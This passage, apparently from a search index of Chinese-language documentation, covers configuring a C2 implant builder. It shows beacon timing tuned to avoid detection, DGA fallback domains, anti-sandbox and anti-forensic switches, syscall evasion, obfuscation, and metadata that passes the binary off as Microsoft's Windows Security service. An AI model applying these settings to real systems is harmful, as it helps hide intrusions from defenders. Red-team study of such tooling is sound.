\u8868\u8fbe\u5f0f\u5b9a\u4e49\u56de\u8fde\u95f4\u9694\uff0c\u683c\u5f0f\u4e3a <code>\u79d2 \u5206 \u65f6 \u65e5 \u6708 \u5468 \u5e74</code></li> <li>jitter: \u6296\u52a8\u8303\u56f4 (0.0-1.0)\uff0c\u907f\u514d\u89c4\u5f8b\u6027\u6d41\u91cf\u7279\u5f81\u88ab\u68c0\u6d4b</li> </ul> <p>\u5e38\u89c1 cron \u914d\u7f6e\u793a\u4f8b\uff1a</p> <pre><code>cron: \"*/30 * * * * * *\"     # \u6bcf30\u79d2\ncron: \"0 */5 * * * * *\"      # \u6bcf5\u5206\u949f\u6574\u70b9\ncron: \"0 0 */2 * * * *\"      # \u6bcf2\u5c0f\u65f6\u6574\u70b9\ncron: \"*/5 * 9-18 * * * *\"   # \u6bcf\u59299-18\u70b9\uff0c\u6bcf5\u79d2\u6267\u884c\u4e00\u6b21\ncron: \"0 */10 8-20 * * 1-5 *\" # \u5de5\u4f5c\u65e58-20\u70b9\uff0c\u6bcf10\u5206\u949f\ncron: \"*/15 * 22-6 * * * *\"   # \u591c\u95f422\u70b9-\u6b21\u65e56\u70b9\uff0c\u6bcf15\u79d2\n</code></pre>"},{"location":"IoM/manual/implant/build/#423-\u901a\u4fe1\u52a0\u5bc6\u914d\u7f6e","title":"4.2.3 \u901a\u4fe1\u52a0\u5bc6\u914d\u7f6e","text":"<pre><code>  encryption: aes              # \u52a0\u5bc6\u7b97\u6cd5\u9009\u62e9\n  key: \"maliceofinternal\"      # \u52a0\u5bc6\u5bc6\u94a5\n</code></pre> <p>\u652f\u6301\u7684\u52a0\u5bc6\u7b97\u6cd5\uff1a</p> <ul> <li>aes: AES \u5bf9\u79f0\u52a0\u5bc6\uff0c\u5e73\u8861\u5b89\u5168\u6027\u548c\u6027\u80fd</li> <li>xor: XOR \u5f02\u6216\u52a0\u5bc6\uff0c\u6700\u8f7b\u91cf\u4f46\u5b89\u5168\u6027\u8f83\u4f4e</li> <li>chacha20: ChaCha20 \u6d41\u5bc6\u7801\uff0c\u9ad8\u5b89\u5168\u6027</li> </ul>"},{"location":"IoM/manual/implant/build/#424-\u5b89\u5168\u901a\u4fe1\u914d\u7f6e","title":"4.2.4 \u5b89\u5168\u901a\u4fe1\u914d\u7f6e","text":"<pre><code>  secure:\n    enable: false                    # \u542f\u7528\u9ad8\u7ea7\u5b89\u5168\u901a\u4fe1\n    private_key: \"\"                  # \u690d\u5165\u4f53\u79c1\u94a5\n    public_key: \"\"                   # \u670d\u52a1\u5668\u516c\u94a5\n</code></pre> <p>\u5b57\u6bb5\u8bf4\u660e\uff1a</p> <ul> <li>enable: \u662f\u5426\u542f\u7528\u57fa\u4e8e\u516c\u79c1\u94a5\u7684\u9ad8\u7ea7\u5b89\u5168\u901a\u4fe1</li> <li>private_key: \u690d\u5165\u4f53\u7684\u79c1\u94a5\uff0c\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\u548c\u5bc6\u94a5\u4ea4\u6362</li> <li>public_key: \u670d\u52a1\u5668\u7684\u516c\u94a5\uff0c\u7528\u4e8e\u9a8c\u8bc1\u670d\u52a1\u5668\u8eab\u4efd\u548c\u52a0\u5bc6\u901a\u4fe1</li> </ul>"},{"location":"IoM/manual/implant/build/#425-dga\u57df\u540d\u751f\u6210\u7b97\u6cd5\u914d\u7f6e","title":"4.2.5 DGA\uff08\u57df\u540d\u751f\u6210\u7b97\u6cd5\uff09\u914d\u7f6e","text":"<pre><code>  dga:\n    enable: true                 # \u542f\u7528 DGA \u529f\u80fd\n    key: \"malefic_dga_2024\"      # DGA \u79cd\u5b50\u5bc6\u94a5\n    interval_hours: 8            # \u57df\u540d\u66f4\u65b0\u95f4\u9694\uff08\u5c0f\u65f6\uff09\n</code></pre> <p>\u5b57\u6bb5\u8bf4\u660e\uff1a</p> <ul> <li>enable: \u5f53\u4e3b\u670d\u52a1\u5668\u4e0d\u53ef\u8fbe\u65f6\uff0c\u81ea\u52a8\u751f\u6210\u5907\u7528\u57df\u540d</li> <li>key: \u5f71\u54cd\u57df\u540d\u751f\u6210\u7b97\u6cd5\u7684\u79cd\u5b50\uff0c\u786e\u4fdd C2 \u670d\u52a1\u5668\u548c\u690d\u5165\u4f53\u540c\u6b65</li> <li>interval_hours: \u57df\u540d\u8f6e\u6362\u9891\u7387\uff0c\u5efa\u8bae 6-24 \u5c0f\u65f6</li> </ul>"},{"location":"IoM/manual/implant/build/#426-\u76ee\u6807\u670d\u52a1\u5668\u914d\u7f6e","title":"4.2.6 \u76ee\u6807\u670d\u52a1\u5668\u914d\u7f6e","text":""},{"location":"IoM/manual/implant/build/#http-\u8fde\u63a5\u914d\u7f6e","title":"HTTP \u8fde\u63a5\u914d\u7f6e","text":"<pre><code>targets:\n  - address: \"127.0.0.1:443\"             # \u670d\u52a1\u5668\u5730\u5740 (IP:\u7aef\u53e3)\n    http:\n      method: \"POST\"                     # HTTP \u65b9\u6cd5\n      path: \"/\"                          # \u8bf7\u6c42\u8def\u5f84\n      version: \"1.1\"                     # HTTP \u7248\u672c\n      headers:                           # \u81ea\u5b9a\u4e49 HTTP \u5934\n        User-Agent: \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"\n        Content-Type: \"application/octet-stream\"\n    tls:\n      enable: true                       # \u542f\u7528 TLS \u52a0\u5bc6\n      skip_verification: true            # \u8df3\u8fc7\u8bc1\u4e66\u9a8c\u8bc1\n</code></pre> <p>\u5b57\u6bb5\u8bf4\u660e\uff1a</p> <ul> <li>address: \u76ee\u6807\u670d\u52a1\u5668\u7684 IP \u5730\u5740\u548c\u7aef\u53e3</li> <li>http: HTTP \u534f\u8bae\u914d\u7f6e</li> <li>method: HTTP \u8bf7\u6c42\u65b9\u6cd5\uff0c\u63a8\u8350\u4f7f\u7528 <code>POST</code>\uff08\u6570\u636e\u91cf\u5927\uff09\u6216 <code>GET</code>\uff08\u66f4\u9690\u853d\uff09</li> <li>path: \u8bf7\u6c42\u8def\u5f84\uff0c\u53ef\u6a21\u62df\u5408\u6cd5 Web \u8d44\u6e90\u8def\u5f84\u5982 <code>/api/v1/data</code>\u3001<code>/jquery.min.js</code></li> <li>version: HTTP \u7248\u672c\uff0c\u901a\u5e38\u4f7f\u7528 \"1.1\"</li> <li>headers: \u81ea\u5b9a\u4e49 HTTP \u5934\uff0cUser-Agent \u5e94\u5339\u914d\u76ee\u6807\u73af\u5883\u7684\u5e38\u89c1\u6d4f\u89c8\u5668</li> <li>tls: TLS/SSL \u914d\u7f6e\uff08\u53ef\u9009\uff0c\u4e0ehttp\u540c\u65f6\u4f7f\u7528\u65f6\u8868\u793aHTTPS\uff09</li> </ul>"},{"location":"IoM/manual/implant/build/#\u5e26\u57df\u540d\u7684https\u8fde\u63a5\u914d\u7f6e","title":"\u5e26\u57df\u540d\u7684HTTPS\u8fde\u63a5\u914d\u7f6e","text":"<pre><code>targets:\n  - address: \"default.example.com:443\"\n    domain_suffix: \"example.com\"         # DGA\u57df\u540d\u540e\u7f00\n    http:\n      method: \"POST\"\n      path: \"/\"\n      version: \"1.1\" \n      headers:\n        User-Agent: \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\"\n        Content-Type: \"application/octet-stream\"\n    tls:\n      enable: true                       # \u542f\u7528 TLS \u52a0\u5bc6\n      sni: \"default.example.com\"         # Server Name Indication\n      skip_verification: true            # \u8df3\u8fc7\u8bc1\u4e66\u9a8c\u8bc1\n</code></pre> <p>\u5b57\u6bb5\u8bf4\u660e\uff1a</p> <ul> <li>domain_suffix: DGA\u57df\u540d\u540e\u7f00\uff0c\u5f53\u9ed8\u8ba4\u670d\u52a1\u5668\u65e0\u6cd5\u8fde\u63a5\u65f6\uff0c\u4f7f\u7528DGA\u6a21\u5f0f\u751f\u6210\u65b0\u57df\u540d</li> <li>tls: TLS/SSL \u914d\u7f6e</li> <li>enable: \u542f\u7528 TLS/SSL \u52a0\u5bc6\u4f20\u8f93</li> <li>sni: \u7528\u4e8e TLS \u63e1\u624b\u7684\u670d\u52a1\u5668\u540d\u79f0\uff0c\u652f\u6301\u57df\u540d\u524d\u7f6e\u7b49\u6280\u672f</li> <li>skip_verification: <ul> <li><code>false</code>: \u9a8c\u8bc1\u670d\u52a1\u5668\u8bc1\u4e66\uff08\u63a8\u8350\uff0c\u66f4\u53ef\u4fe1\uff09</li> <li><code>true</code>: \u8df3\u8fc7\u9a8c\u8bc1\uff08\u9002\u7528\u4e8e\u81ea\u7b7e\u540d\u8bc1\u4e66\u6216\u6d4b\u8bd5\u73af\u5883\uff09</li> </ul> </li> </ul>"},{"location":"IoM/manual/implant/build/#mtls\u53cc\u5411\u8ba4\u8bc1\u914d\u7f6e","title":"mTLS\uff08\u53cc\u5411\u8ba4\u8bc1\uff09\u914d\u7f6e","text":"<pre><code>targets:\n  - address: \"secure.example.com:443\"\n    http:\n      method: \"POST\"\n      path: \"/secure-api\"\n      version: \"1.1\"\n      headers:\n        User-Agent: \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\"\n        Content-Type: \"application/octet-stream\"\n    tls:\n      enable: true\n      sni: \"secure.example.com\"\n      skip_verification: false\n      mtls:\n        server_ca: \"/path/to/ca.crt\"      # CA \u6839\u8bc1\u4e66\u8def\u5f84\n        client_cert: \"/path/to/client.crt\" # \u5ba2\u6237\u7aef\u8bc1\u4e66\u8def\u5f84  \n        client_key: \"/path/to/client.key\"  # \u5ba2\u6237\u7aef\u79c1\u94a5\u8def\u5f84\n</code></pre>"},{"location":"IoM/manual/implant/build/#tcp-\u8fde\u63a5\u914d\u7f6e","title":"TCP \u8fde\u63a5\u914d\u7f6e","text":"<pre><code>targets:\n  - address: \"127.0.0.1:5001\"            # TCP \u670d\u52a1\u5668\u5730\u5740\n    tcp: {}                              # \u539f\u59cb TCP \u8fde\u63a5\n</code></pre>"},{"location":"IoM/manual/implant/build/#tcp-tls-\u914d\u7f6e","title":"TCP + TLS \u914d\u7f6e","text":"<pre><code>targets:\n  - address: \"127.0.0.1:5001\"\n    tcp: {}\n    tls:\n      enable: true\n      sni: \"cdn.jquery.com\"\n      skip_verification: true\n</code></pre>"},{"location":"IoM/manual/implant/build/#rem-\u534f\u8bae\u914d\u7f6e","title":"REM \u534f\u8bae\u914d\u7f6e","text":"<pre><code>targets:\n  - address: \"127.0.0.1:34996\"           # REM \u670d\u52a1\u5668\u5730\u5740\n    rem:\n      link: \"tcp://nonenonenonenone:@127.0.0.1:12345?wrapper=lsJy\"\n</code></pre> <p>REM \u534f\u8bae\u8bf4\u660e\uff1a</p> <ul> <li>REM \u662f IoM \u7684\u81ea\u5b9a\u4e49\u534f\u8bae\uff0c\u652f\u6301\u66f4\u7075\u6d3b\u7684\u6d41\u91cf\u4f2a\u88c5</li> <li><code>link</code> \u683c\u5f0f\uff1a<code>[transport]://[key]:@[host]:[port]?wrapper=[]&amp;tls=[bool]&amp;tlsintls=[bool]&amp;compress=[bool]</code>\uff0c\u8be6\u60c5\u8bf7\u53c2\u8003REM\u7528\u6cd5\u6587\u6863</li> </ul>"},{"location":"IoM/manual/implant/build/#\u591a\u670d\u52a1\u5668\u914d\u7f6e","title":"\u591a\u670d\u52a1\u5668\u914d\u7f6e","text":"<p>\u690d\u5165\u4f53\u5df2\u652f\u6301\u4e3b\u670d\u52a1\u5668+\u591a\u4e2a\u5907\u7528\u670d\u52a1\u5668\u7684\u529f\u80fd(\u5373\u591a\u57df\u540d/IP\u7684\u652f\u6301)\uff0c \u76ee\u524d\u8f6e\u8be2\u987a\u5e8f\u6309\u7167yaml\u4e2d\u7684\u5b9a\u4e49\u987a\u5e8f\uff0c\u9996\u4e2a\u914d\u7f6e\u4e3a\u4e3b\u670d\u52a1\u5668\uff0c\u5176\u4ed6\u4e3a\u5907\u4efd\u670d\u52a1\u5668 :</p> <p>\u591a\u670d\u52a1\u5668\u7684\u914d\u7f6e\u76ee\u524d\u4ec5\u652f\u6301\u5355\u4e00\u534f\u8bae\u901a\u4fe1</p> <p>\u76ee\u524d\u6211\u4eec\u4f7f\u7528feature\u4e25\u683c\u63a7\u5236\u6587\u4ef6\u5927\u5c0f\uff0c\u540e\u7eed\u4f18\u5316\u540e\u4f1a\u652f\u6301\u591a\u534f\u8bae\u591a\u670d\u52a1\u5668\u7684\u914d\u7f6e</p> <pre><code>targets:\n  # \u4e3b\u670d\u52a1\u5668 - HTTP\n  - address: \"primary.example.com:80\"\n    http:\n      method: \"GET\"\n      path: \"/search\"\n      version: \"1.1\"\n      headers:\n        User-Agent: \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n\n  # \u5907\u7528\u670d\u52a1\u5668 - HTTPS  \n  - address: \"backup.example.com:443\"\n    http:\n      method: \"POST\"\n      path: \"/api/sync\"\n      version: \"1.1\"\n      headers:\n        User-Agent: \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\"\n        Content-Type: \"application/json\"\n    tls:\n      enable: true\n      sni: \"backup.example.com\"\n      skip_verification: false\n</code></pre> <p>\u591a\u670d\u52a1\u5668\u8f6e\u6362\u903b\u8f91\uff1a</p> <ol> <li>\u6309\u7167\u914d\u7f6e\u987a\u5e8f\u4f9d\u6b21\u5c1d\u8bd5\u8fde\u63a5</li> <li>\u5355\u4e2a\u670d\u52a1\u5668\u5931\u8d25\u65f6\uff0c\u6839\u636e <code>server_retry</code> \u8bbe\u7f6e\u91cd\u8bd5</li> <li>\u6240\u6709\u670d\u52a1\u5668\u90fd\u5931\u8d25\u65f6\uff0c\u5982\u679c\u542f\u7528\u4e86 DGA\uff0c\u5c06\u751f\u6210\u65b0\u7684\u57df\u540d\u91cd\u8bd5</li> <li>\u8fbe\u5230 <code>global_retry</code> \u9650\u5236\u540e\u505c\u6b62\u91cd\u8bd5</li> </ol>"},{"location":"IoM/manual/implant/build/#43-implants-\u690d\u5165\u4f53\u9ad8\u7ea7\u914d\u7f6e","title":"4.3 implants - \u690d\u5165\u4f53\u9ad8\u7ea7\u914d\u7f6e","text":""},{"location":"IoM/manual/implant/build/#431-\u57fa\u7840\u8fd0\u884c\u65f6\u914d\u7f6e","title":"4.3.1 \u57fa\u7840\u8fd0\u884c\u65f6\u914d\u7f6e","text":"<pre><code>implants:\n  runtime: tokio          # async runtime: smol/tokio/async-std\n  mod: beacon             # malefic mod: beacon/bind\n  register_info: true     # whether collect sysinfo when register\n  hot_load: true          # enable hot load module\n</code></pre> <p>\u5b57\u6bb5\u89e3\u91ca\uff1a</p> <ul> <li>runtime: \u5f02\u6b65\u8fd0\u884c\u65f6\u6846\u67b6\uff0c\u53ef\u9009 <code>smol</code>/<code>tokio</code>/<code>async-std</code>\u3002<code>tokio</code> \u662f\u6700\u6210\u719f\u7684\u9009\u62e9\uff0c\u6027\u80fd\u548c\u751f\u6001\u6700\u597d\u3002</li> <li>mod: \u690d\u5165\u4f53\u5de5\u4f5c\u6a21\u5f0f\uff0c<code>beacon</code>\uff08\u56de\u8fde\u6a21\u5f0f\uff09\u6216 <code>bind</code>\uff08\u76d1\u542c\u6a21\u5f0f\uff09\u3002</li> <li>register_info: \u662f\u5426\u5728\u9996\u6b21\u8fde\u63a5\u65f6\u6536\u96c6\u76ee\u6807\u7cfb\u7edf\u4fe1\u606f\uff08OS\u7248\u672c\u3001\u786c\u4ef6\u7b49\uff09\u3002</li> <li>hot_load: \u662f\u5426\u652f\u6301\u8fd0\u884c\u65f6\u52a8\u6001\u52a0\u8f7d\u65b0\u6a21\u5757\uff0c\u63d0\u5347\u7075\u6d3b\u6027\u4f46\u7565\u589e\u590d\u6742\u5ea6\u3002</li> </ul>"},{"location":"IoM/manual/implant/build/#432-\u6a21\u5757\u7ba1\u7406\u914d\u7f6e","title":"4.3.2 \u6a21\u5757\u7ba1\u7406\u914d\u7f6e","text":"<pre><code>  modules:                # module when malefic compile\n    - \"nano\"\n  enable_3rd: false       # enable 3rd module\n  3rd_modules:            # 3rd module when malefic compile\n    #    - curl\n    #    - rem_static\n    - full\n</code></pre> <p>\u5b57\u6bb5\u89e3\u91ca\uff1a</p> <ul> <li>modules: \u7f16\u8bd1\u65f6\u9759\u6001\u94fe\u63a5\u7684\u5185\u7f6e\u6a21\u5757\u5217\u8868\u3002<code>nano</code> \u662f\u8f7b\u91cf\u7ea7\u57fa\u7840\u6a21\u5757\u3002\u8fd8\u6709\u5168\u90e8\u5e38\u89c1\u529f\u80fd\u7684full\u3001\u652f\u6301\u57fa\u7840\u64cd\u4f5c\u7684base\u7b49</li> <li>enable_3rd: \u662f\u5426\u542f\u7528\u7b2c\u4e09\u65b9\u6a21\u5757\u652f\u6301\uff0c<code>false</code> \u65f6\u5ffd\u7565 <code>3rd_modules</code>\u3002</li> <li>3rd_modules: \u7b2c\u4e09\u65b9\u6a21\u5757\u5217\u8868\uff0c<code>full</code> \u8868\u793a\u5305\u542b\u6240\u6709\u53ef\u7528\u6a21\u5757\uff1b\u5177\u4f53\u6a21\u5757\u5982 <code>curl</code>\uff08HTTP\u5ba2\u6237\u7aef\uff09\u3001<code>rem_static</code>\uff08\u9759\u6001REM\u534f\u8bae\uff09\u3002</li> </ul>"},{"location":"IoM/manual/implant/build/#433-\u6587\u4ef6\u6253\u5305\u4e0e\u6807\u8bc6\u914d\u7f6e","title":"4.3.3 \u6587\u4ef6\u6253\u5305\u4e0e\u6807\u8bc6\u914d\u7f6e","text":"<pre><code>  autorun: \"\"             # autorun config filename\n  pack:                   # pack\n  #    - src: \"1.docx\"\n  #      dst: \"1.docs\"\n  flags:\n    start: 0x41\n    end: 0x42\n    magic: \"beautiful\"\n    artifact_id: 0x1\n</code></pre> <p>\u5b57\u6bb5\u89e3\u91ca\uff1a</p> <ul> <li>autorun: \u81ea\u52a8\u6267\u884c\u811a\u672c\u7684\u914d\u7f6e\u6587\u4ef6\u540d\uff0c\u7559\u7a7a\u5219\u65e0\u81ea\u52a8\u6267\u884c\u3002</li> <li>pack: \u5c06\u5916\u90e8\u6587\u4ef6\u6253\u5305\u5230\u690d\u5165\u4f53\u4e2d\uff0c<code>src</code> \u662f\u6e90\u6587\u4ef6\uff0c<code>dst</code> \u662f\u690d\u5165\u4f53\u5185\u8def\u5f84\u3002</li> <li>flags: \u690d\u5165\u4f53\u6807\u8bc6\u914d\u7f6e</li> <li>start/end: \u6570\u636e\u6bb5\u6807\u8bb0\u5b57\u8282\uff0c\u7528\u4e8e\u5b9a\u4f4d\u690d\u5165\u4f53\u6570\u636e\u8fb9\u754c</li> <li>magic: \u9b54\u672f\u5b57\u7b26\u4e32\uff0c\u7528\u4e8e\u9a8c\u8bc1\u690d\u5165\u4f53\u5b8c\u6574\u6027</li> <li>artifact_id: \u6784\u5efa\u4ea7\u7269\u552f\u4e00\u6807\u8bc6\uff0c\u4fbf\u4e8e\u7ba1\u7406\u591a\u4e2a\u53d8\u79cd</li> </ul>"},{"location":"IoM/manual/implant/build/#434-\u53cd\u68c0\u6d4b\u4e0e\u5bf9\u6297\u914d\u7f6e","title":"4.3.4 \u53cd\u68c0\u6d4b\u4e0e\u5bf9\u6297\u914d\u7f6e","text":"<pre><code>  # for professional\n  anti: # \u53cd\u6c99\u7bb1\u53cd\u8c03\u8bd5\u53cd\u7f16\u8bd1\u53cd\u53d6\u8bc1\u76f8\u5173\n    sandbox: false\n    vm: false            # enable anti vm\n    # debug: true         # enable anti debug\n    # disasm: true        # enable anti disasm\n    # emulator: true      # enable anti emulator\n    # forensic: true      # enable anti forensic\n</code></pre> <p>\u5b57\u6bb5\u89e3\u91ca\uff1a</p> <ul> <li>sandbox: \u53cd\u6c99\u7bb1\u68c0\u6d4b\uff0c\u68c0\u6d4b\u52a8\u6001\u5206\u6790\u73af\u5883\u5e76\u9000\u51fa\u6216\u6539\u53d8\u884c\u4e3a</li> <li>vm: \u53cd\u865a\u62df\u673a\u68c0\u6d4b\uff0c\u8bc6\u522b VMware/VirtualBox \u7b49\u865a\u62df\u5316\u73af\u5883</li> <li>debug: \u53cd\u8c03\u8bd5\u68c0\u6d4b\uff0c\u963b\u6b62\u8c03\u8bd5\u5668\u9644\u52a0\u6216\u68c0\u6d4b\u8c03\u8bd5\u72b6\u6001</li> <li>disasm: \u53cd\u53cd\u6c47\u7f16\uff0c\u589e\u52a0\u9759\u6001\u5206\u6790\u96be\u5ea6</li> <li>emulator: \u53cd\u6a21\u62df\u5668\uff0c\u68c0\u6d4b QEMU \u7b49\u6a21\u62df\u73af\u5883</li> <li>forensic: \u53cd\u53d6\u8bc1\uff0c\u5bf9\u6297\u5185\u5b58\u53d6\u8bc1\u548c\u78c1\u76d8\u5206\u6790</li> </ul>"},{"location":"IoM/manual/implant/build/#435-api-\u8c03\u7528\u7b56\u7565\u914d\u7f6e","title":"4.3.5 API \u8c03\u7528\u7b56\u7565\u914d\u7f6e","text":"<pre><code>  apis:\n    # apis_level: \"sys_apis\", \"nt_apis\"\n    level: \"nt_apis\"\n    # apis_priority: \"normal\", \"user_defined_dyanmic\", \"func_syscall\" \"syscalls\"\n    priority:\n      normal:\n        enable: false\n        type: \"normal\"\n      dynamic:\n        enable: true\n        # type: \"sys_dynamic\", \"user_defined_dynamic\"\n        type: \"user_defined_dynamic\"\n      syscalls:\n        enable: false\n        # type: \"func_syscall\", \"inline_syscall\"\n        type: \"inline_syscall\"\n</code></pre> <p>\u5b57\u6bb5\u89e3\u91ca\uff1a</p> <ul> <li>level: API \u8c03\u7528\u5c42\u7ea7\uff0c<code>sys_apis</code>\uff08\u7cfb\u7edfAPI\uff09\u6216 <code>nt_apis</code>\uff08\u5185\u6838API\uff09\u3002<code>nt_apis</code> \u66f4\u5e95\u5c42\uff0cbypass \u80fd\u529b\u66f4\u5f3a\u3002</li> <li>priority: API \u8c03\u7528\u4f18\u5148\u7ea7\u7b56\u7565</li> <li>normal: \u76f4\u63a5\u8c03\u7528 Windows API\uff0c\u6700\u7b80\u5355\u4f46\u6700\u5bb9\u6613\u88ab hook</li> <li>dynamic: \u52a8\u6001\u89e3\u6790API\uff0c<code>user_defined_dynamic</code> \u8868\u793a\u81ea\u5b9a\u4e49\u52a8\u6001\u52a0\u8f7d\u65b9\u5f0f\uff0c\u589e\u5f3a\u9690\u853d\u6027</li> <li>syscalls: \u76f4\u63a5\u7cfb\u7edf\u8c03\u7528\uff0c<code>inline_syscall</code> \u5185\u8054\u6c47\u7f16\u8c03\u7528\uff0cbypass \u80fd\u529b\u6700\u5f3a\u4f46\u517c\u5bb9\u6027\u8981\u6c42\u9ad8</li> </ul>"},{"location":"IoM/manual/implant/build/#436-\u5185\u5b58\u5206\u914d\u4e0e\u6267\u884c\u914d\u7f6e","title":"4.3.6 \u5185\u5b58\u5206\u914d\u4e0e\u6267\u884c\u914d\u7f6e","text":"<pre><code>  alloctor:\n    # inprocess: \"VirtualAlloc\", \"VirtualAllocEx\",\n    #            \"VirtualAllocExNuma\", \"HeapAlloc\",\n    #            \"NtMapViewOfSection\", \"NtAllocateVirtualMemory\"\n    inprocess: \"NtAllocateVirtualMemory\"\n    # allocter_ex: \"VirtualAllocEx\", \"NtAllocateVirtualMemory\",\n    #              \"VirtualAllocExNuma\", \"NtMapViewOfSection\"\n    crossprocess: \"NtAllocateVirtualMemory\"\n  thread_stack_spoofer: true\n</code></pre> <p>\u5b57\u6bb5\u89e3\u91ca\uff1a</p> <ul> <li>alloctor: \u5185\u5b58\u5206\u914d\u5668\u9009\u62e9</li> <li>inprocess: \u8fdb\u7a0b\u5185\u5206\u914d\uff0c\u53ef\u9009 <code>VirtualAlloc</code>/<code>HeapAlloc</code>/<code>NtAllocateVirtualMemory</code> \u7b49</li> <li>crossprocess: \u8de8\u8fdb\u7a0b\u5206\u914d\uff0c\u7528\u4e8e\u6ce8\u5165\u7b49\u573a\u666f</li> <li>thread_stack_spoofer: \u7ebf\u7a0b\u6808\u6b3a\u9a97\uff0c\u4f2a\u9020\u8c03\u7528\u6808\u4ee5\u7ed5\u8fc7\u57fa\u4e8e\u8c03\u7528\u6808\u7684\u68c0\u6d4b</li> </ul>"},{"location":"IoM/manual/implant/build/#437-pe-\u6587\u4ef6\u7b7e\u540d\u4fee\u6539\u914d\u7f6e","title":"4.3.7 PE \u6587\u4ef6\u7b7e\u540d\u4fee\u6539\u914d\u7f6e","text":"<pre><code>  pe_signature_modify:\n    feature: true\n    modify:\n      magic: \"\\x00\\x00\"\n      signature: \"\\x00\\x00\"\n</code></pre> <p>\u5b57\u6bb5\u89e3\u91ca\uff1a</p> <ul> <li>feature: \u662f\u5426\u542f\u7528 PE \u7b7e\u540d\u4fee\u6539\u529f\u80fd</li> <li>modify: \u5177\u4f53\u4fee\u6539\u5185\u5bb9</li> <li>magic: \u4fee\u6539 PE \u9b54\u672f\u5b57\u8282\uff0c\u5e72\u6270\u9759\u6001\u68c0\u6d4b</li> <li>signature: \u4fee\u6539 PE \u7b7e\u540d\u6807\u8bc6\uff0c\u7834\u574f\u539f\u59cb\u7b7e\u540d\u4f46\u53ef\u80fd\u7ed5\u8fc7\u67d0\u4e9b\u68c0\u6d4b</li> </ul>"},{"location":"IoM/manual/implant/build/#44-build-\u7f16\u8bd1\u6784\u5efa\u914d\u7f6e","title":"4.4 build - \u7f16\u8bd1\u6784\u5efa\u914d\u7f6e","text":""},{"location":"IoM/manual/implant/build/#441-\u7f16\u8bd1\u5de5\u5177\u94fe\u914d\u7f6e","title":"4.4.1 \u7f16\u8bd1\u5de5\u5177\u94fe\u914d\u7f6e","text":"<pre><code>build:\n  zigbuild: false                        # \u662f\u5426\u4f7f\u7528 Zig \u4ea4\u53c9\u7f16\u8bd1\n  remap: false                           # \u662f\u5426\u542f\u7528\u8def\u5f84\u91cd\u6620\u5c04\n  toolchain: \"nightly-2023-09-18\"       # Rust \u5de5\u5177\u94fe\u7248\u672c\n</code></pre> <p>\u5b57\u6bb5\u8bf4\u660e\uff1a</p> <ul> <li>zigbuild: \u4f7f\u7528 Zig \u4f5c\u4e3a C/C++ \u7f16\u8bd1\u5668\uff0c\u63d0\u4f9b\u66f4\u597d\u7684\u4ea4\u53c9\u7f16\u8bd1\u652f\u6301</li> <li>remap: \u7f16\u8bd1\u65f6\u91cd\u6620\u5c04\u6e90\u6587\u4ef6\u8def\u5f84\uff0c\u6e05\u9664\u6784\u5efa\u73af\u5883\u4fe1\u606f</li> <li>toolchain: \u6307\u5b9a Rust \u5de5\u5177\u94fe\u7248\u672c\uff0c\u786e\u4fdd\u7f16\u8bd1\u73af\u5883\u4e00\u81f4\u6027</li> </ul>"},{"location":"IoM/manual/implant/build/#442-ollvm-\u6df7\u6dc6\u914d\u7f6e","title":"4.4.2 OLLVM \u6df7\u6dc6\u914d\u7f6e","text":"<p>ollvm\u76f8\u5173\u914d\u7f6e\u53ea\u652f\u6301\u5728IoM\u63d0\u4f9b\u7684malefic-builder\u4e2d\u4f7f\u7528</p> <pre><code>build:\n  ollvm:\n    enable: false                        # \u603b\u5f00\u5173\n    bcfobf: false                        # \u4f2a\u63a7\u5236\u6d41\u6df7\u6dc6\n    splitobf: false                      # \u63a7\u5236\u6d41\u62c6\u5206\n    subobf: false                        # \u6307\u4ee4\u66ff\u6362\u6df7\u6dc6\n    fco: false                           # \u51fd\u6570\u8c03\u7528\u6df7\u6dc6\n    constenc: false                      # \u5e38\u91cf\u52a0\u5bc6\n</code></pre> <p>\u6df7\u6dc6\u6280\u672f\u8bf4\u660e\uff1a</p> <ul> <li>bcfobf: \u63d2\u5165\u65e0\u7528\u7684\u63a7\u5236\u6d41\u5206\u652f\uff0c\u589e\u52a0\u53cd\u7f16\u8bd1\u96be\u5ea6</li> <li>splitobf: \u5c06\u57fa\u672c\u5757\u62c6\u5206\u5e76\u91cd\u6392\uff0c\u7834\u574f\u539f\u59cb\u7a0b\u5e8f\u7ed3\u6784</li> <li>subobf: \u7528\u7b49\u4ef7\u4f46\u590d\u6742\u7684\u6307\u4ee4\u5e8f\u5217\u66ff\u6362\u7b80\u5355\u6307\u4ee4</li> <li>fco: \u9690\u85cf\u771f\u5b9e\u7684\u51fd\u6570\u8c03\u7528\u5173\u7cfb</li> <li>constenc: \u8fd0\u884c\u65f6\u89e3\u5bc6\u5b57\u7b26\u4e32\u5e38\u91cf</li> </ul>"},{"location":"IoM/manual/implant/build/#443-\u4e8c\u8fdb\u5236\u5143\u6570\u636e\u914d\u7f6e","title":"4.4.3 \u4e8c\u8fdb\u5236\u5143\u6570\u636e\u914d\u7f6e","text":"<pre><code>build:\n  metadata:\n    remap_path: \"C:/Windows/System32/\"   # \u8def\u5f84\u91cd\u6620\u5c04\n    icon: \"assets/app.ico\"               # \u7a0b\u5e8f\u56fe\u6807\n    compile_time: \"15 Jun 2019 10:30:00\" # \u7f16\u8bd1\u65f6\u95f4\u4f2a\u88c5\n    file_version: \"10.0.19041.1\"        # \u6587\u4ef6\u7248\u672c\n    product_version: \"10.0.19041.1\"     # \u4ea7\u54c1\u7248\u672c\n    company_name: \"Microsoft Corporation\" # \u516c\u53f8\u540d\u79f0\n    product_name: \"Windows Security\"    # \u4ea7\u54c1\u540d\u79f0\n    original_filename: \"SecurityHealth.exe\" # \u539f\u59cb\u6587\u4ef6\u540d\n    file_description: \"Windows Security Health Service\" # \u6587\u4ef6\u63cf\u8ff0\n    internal_name: \"SecurityHealth\"     # \u5185\u90e8\u540d\u79f0\n    require_admin: false                 # \u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\n    require_uac: false                   # \u9700\u8981 UAC \u63d0\u6743\n</code></pre>"},{"location":"IoM/manual/implant/build/#45-pulse\u914d\u7f6e","title":"4.5 pulse\u914d\u7f6e","text":"<p>Pulse \u662f IoM \u7684\u8f7b\u91cf\u7ea7 